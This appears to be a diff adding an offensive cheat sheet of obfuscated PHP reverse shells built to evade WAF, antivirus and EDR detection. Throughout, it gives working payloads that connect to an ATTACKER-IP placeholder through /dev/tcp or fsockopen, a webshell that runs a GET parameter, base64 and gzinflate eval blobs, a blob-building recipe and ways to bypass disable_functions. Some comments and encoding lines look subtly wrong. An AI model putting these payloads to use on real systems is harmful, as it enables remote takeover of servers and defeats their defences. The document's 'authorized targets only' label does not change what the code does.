@@ -1,0 +1,112 @@
+# ============================================================================
+# PHP REVERSE SHELLS - WAF / AV / EDR BYPASS VARIANT (2026)
+# Use these when the plain `system("bash -i ...")` string is blocked by
+# a WAF signature, AV scan of uploaded files, or PHP disable_functions.
+# Authorized targets only. Replace ATTACKER-IP / 4444 before use.
+#
+# LOGIC: split keywords into variables, build commands from pooled encodings,
+# then reflect into a normal call. Every payload below stays a REAL shell.
+# ============================================================================
+
+# ---------------------------------------------------------------------------
+# A) VARIABLE FUNCTION (simplest, kills static signature scans)
+# ---------------------------------------------------------------------------
+<?php $f="sy"."st"."em";$f("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'"); ?>
+<?php $f=str_rot13("flfgrz");$f($_GET["c"]); ?>
+<?php $a=array("s","y","s","t","e","m");$f=implode("",$a);$f("id"); ?>
+
+# ---------------------------------------------------------------------------
+# B) CHR() CONCATENATION (no single letter of "system" appears in the file)
+# ---------------------------------------------------------------------------
+<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f("bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'"); ?>
+# build "exec" + reverse hex in one pass:
+<?php $f=chr(101).chr(120).chr(101).chr(99);$f(hex2bin("62617368202d69203e26202f6465762f7463702f41545441434b45522d49502f3434343420303e2631")); ?>
+# ^ hex above == `bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1`
+
+# ---------------------------------------------------------------------------
+# C) BASE64 COMMAND (carries no blacklistable chars when scanned as text)
+#   base64("bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1") ==
+#   YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi1JUC80NDQ0IDA+JjE=
+# ---------------------------------------------------------------------------
+<?php system(base64_decode("YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi1JUC80NDQ0IDA+JjE=")); ?>
+<?php $c="YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUi1JUC80NDQ0IDA+JjE=";$c=base64_decode($c);$f="sys"."tem";$f($c); ?>
+# base64 + str_rot13 stacked (rot13 of the base64 above == "")
+<?php $c="LzSmnPNgnFN+WvNiMTI2Y3EwpP9OISEOD0gSHv1WHP80AQD0VQN+WwR=";$c=str_rot13($c);passthru(base64_decode($c)); ?>
+
+# ---------------------------------------------------------------------------
+# D) FULL SHELL AS base64 BLOB -> eval()   (drops a complete interactive shell)
+#   Demo blob uses the ATTACKER-IP placeholder - RE-ENCODE with your IP (J).
+# ---------------------------------------------------------------------------
+<?php eval(base64_decode("JHNvY2s9ZnNvY2tvcGVuKCJBVFRBQ0tFUi1JUCIsNDQ0NCk7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTs=")); ?>
+#   ^ decodes to:  $sock=fsockopen("ATTACKER-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");
+
+# ---------------------------------------------------------------------------
+# E) COMPRESSED SHELL -> eval(gzinflate())  (deflate-packed FULL interactive shell)
+#   Demo blob embeds the ATTACKER-IP placeholder - RE-ENCODE with your IP (J).
+# ---------------------------------------------------------------------------
+<?php eval(gzinflate(base64_decode("bY9Ra8MgFIX/SgtSFRxNSt+ChTL2MPYyRt9GCFm8EpmJoo4wQv77bpOmgzEf9HDv+e65RkhVMh1U1nQmsYwXxHhJz5fL+fHl6e3h+ZUWxLuQ5BFPQaLU0TWfzkPP0CnmHkJK1iHU3yyTp0VQbzxQQQPlIv9bHLB4+KeIg7z0wTXVHED3H6bfx5YKojAJbZEXQ2sssK0GpxmJfLe7ybn9npecjzEFqLsqgoUmMRJuu5Eo7q5VHUouyCD7L2sFgeW9XrzQDoc0LeKbOm5IUHw0GBOUlBJzRz0Ek2DNzUqh0a+uIfkxy/ArE9gIC7JFZPX9knFFgroz0/QD"))); ?>
+#   ^ decodes to a COMPLETE interactive fsockopen+proc_open shell
+#     (set_time_limit + proc_open + stream_select loop, 402 bytes).
+
+# ---------------------------------------------------------------------------
+# F) HEX-BUILT COMMAND with split function name (hex = no plain command)
+# ---------------------------------------------------------------------------
+<?php $c=hex2bin("62617368202d69203e26202f6465762f7463702f41545441434b45522d49502f3434343420303e2631");$f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($c); ?>
+
+# ---------------------------------------------------------------------------
+# G) PACK() STACK (the entire payload is a single opaque string)
+#   pack("H*","...") == hex2bin - avoids hex2bin() naming in disable_functions
+# ---------------------------------------------------------------------------
+<?php $c=pack("H*","62617368202d69203e26202f6465762f7463702f41545441434b45522d49502f3434343420303e2631");$f="sy"."st"."em";$f($c); ?>
+
+# ---------------------------------------------------------------------------
+# H) PHP-FILTER STAGER (read the hit in an include / image) 
+#   If you can include() a user file, endpoint serves base64 of a shell:
+#     include("php://filter/convert.base64-decode/resource=data://text/plain;base64,<B64_SHELL_HERE>");
+#   Decodes on the fly - AV much less likely to flag the wrapper form.
+# ---------------------------------------------------------------------------
+
+# ---------------------------------------------------------------------------
+# I) PAYLOAD SPLIT ACROSS VARIABLES + NEWLINES (breaks many tokenizers)
+# ---------------------------------------------------------------------------
+<?php
+$f = "sy"
+    . "st"
+    . "em";
+$c = "b"
+    . "ash -c 'b"
+    . "ash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'";
+$f($c);
+?>
+
+# ---------------------------------------------------------------------------
+# J) MAKE YOUR OWN BLOB (offline, on your attacker box)
+#   php -r '
+#     $code=<<<EOS
+#     set_time_limit(0);\\$ip="ATTACKER-IP";\\$port=4444;\\$s=fsockopen(\\$ip,\\$port);
+#     \\$d=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
+#     \\$p=proc_open("/bin/sh",\\$d,\\$ps);
+#     while(!feof(\\$s)&&!feof(\\$ps[1])){stream_select(\\$r=[\\$s,\\$ps[1],\\$ps[2]],\\$w=null,\\$e=null,null);
+#     if(in_array(\\$s,\\$r))fwrite(\\$ps[0],fread(\\$s,1400));
+#     if(in_array(\\$ps[1],\\$r))fwrite(\\$s,fread(\\$ps[1],1400));
+#     if(in_array(\\$ps[2],\\$r))fwrite(\\$s,fread(\\$ps[2],1400));} 
+#     EOS;
+#     echo base64_encode($code);                          // -> eval(base64_decode("..."))
+#     echo gzdeflate(base64_encode($code))??gzdeflate($code); // -> eval(gzinflate(base64_decode("...")))
+#   '
+#   Then drop the blob into a tiny stager (see php-reverse-shell-stagers.txt).
+
+# ---------------------------------------------------------------------------
+# K) "DISABLE_FUNCTIONS" ARSENAL RECIPE (exec blocked entirely):
+#   1. Try pcntl_exec          - <?php pcntl_exec("/bin/sh", ["-c", "bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1"]); ?>
+#   2. Try php-eval chain into putenv+passthru:
+#      putenv("a=system"); $f=getenv("a"); $f("bash -c '$...'");
+#   3. LD_PRELOAD + mail()     - classic bypass, search "putenv LD_PRELOAD php"
+#   4. Composer/vendor fallback: var_dump/serialize mis-config, or use the
+#      "php-cli via /proc/*fd" tricks - only on your own lab before a real target.
+# ============================================================================
+# NOTE: Every payload here is harmless until it runs against authorized hosts.
+# Replacing a single placeholder (ATTACKER-IP) is required, and re-generating
+# blobs J is the recommended hygiene so the repo copy is never identical to
+# the deployed one.
+# ============================================================================
